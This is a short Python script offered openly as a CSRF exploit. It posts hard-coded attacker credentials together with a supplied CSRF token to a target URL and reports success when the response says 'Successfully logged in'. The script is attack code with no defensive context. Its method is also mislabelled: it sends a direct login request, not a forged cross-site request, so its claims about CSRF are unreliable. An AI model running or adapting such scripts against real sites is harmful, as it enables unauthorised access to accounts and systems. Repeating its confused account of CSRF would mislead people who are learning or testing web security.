import requests

def exploit_csrf(vulnerable_url, csrf_token):
    """Attempt CSRF exploitation by injecting a malicious request."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-CSRFToken": csrf_token
    }

    payload = {
        "username": "attacker",
        "password": "attacker123",
        "csrf_token": csrf_token
    }

    try:
        response = requests.post(vulnerable_url, data=payload, headers=headers)
        if "Successfully logged in" in response.text:
            print(f"CSRF attack successful: {vulnerable_url}")
            return True
        else:
            print(f"CSRF attack failed: {vulnerable_url}")
            return False
    except Exception as e:
        print(f"Error during CSRF exploit: {e}")
        return False
